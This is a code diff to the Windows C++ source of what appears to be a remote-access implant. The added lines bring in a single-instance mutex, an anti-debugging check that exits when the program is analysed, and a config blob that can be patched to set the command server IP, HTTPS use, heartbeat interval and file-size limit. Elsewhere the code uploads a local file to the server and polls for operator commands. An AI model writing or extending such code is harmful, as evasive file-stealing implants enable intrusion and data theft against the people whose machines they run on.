@@ -20,26 +20,49 @@
 #include "command.h"
 #include <windows.h>
 #include <Shlwapi.h>
-
+#include "utils.h"
+#include "main.h"
 #include "dialog.h"
 
 #pragma comment(lib,"Shlwapi.lib")
 #pragma comment(lib,"ws2_32.lib")
 
+
 using namespace std;
 
 
-
+char g_program_params[MAX_PATH] = "0123456789abcdef";
 
 int init() {
-	WSAData wsa;
-
 	int ret = 0;
+
+	g_mutex_handle = bRunning(&ret);
+	if (ret)
+	{
+		ExitProcess(0);
+	}
+
+	ret = isDebugged();
+	if (ret)
+	{
+		ExitProcess(0);
+	}
+
+	WSAData wsa;
 	ret = WSAStartup(0x0202, &wsa);
 
-	g_ip = inet_addr("192.168.231.1");
-
-	g_httpsToggle = FALSE;
+	PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(g_program_params + 16);
+	if (params->ip)
+	{
+		g_httpsToggle = params->bHttps;
+		g_ip = params->ip;
+		g_interval = params->hbi * 1000;
+		g_fsize_limit = params->fzLimit*1024*1024;
+	}
+	else {
+		g_ip = inet_addr("192.168.231.1");
+		g_httpsToggle = FALSE;
+	}
 
 	ret = getUUID();
 
@@ -146,18 +169,15 @@ int postProc() {
 
 		lstrcpyA(g_uuid, host.c_str());
 
-
 		//const char* mydata = "hello,how are you?\r\n fine,thank you,and you?\r\ni am fine too\r\n";
 
 		const char* myfn = "C:\\Users\\ljg\\test.txt";
-
 
 		ret = packet.postCmdFile(CMD_SEND_DD_DATA, myfn,16);
 
 		Sleep(5000);
 
 		ret = packet.postCmd(CMD_QUERY_OPERATOR,0,0);
-
 	}
 
 	return ret;
@@ -228,8 +248,6 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	ret = init();
 
 	ret = createDialog(hInstance);
-
-	Sleep(-1);
 
 	//ret = fileMission();
 	//ret = mainProc();
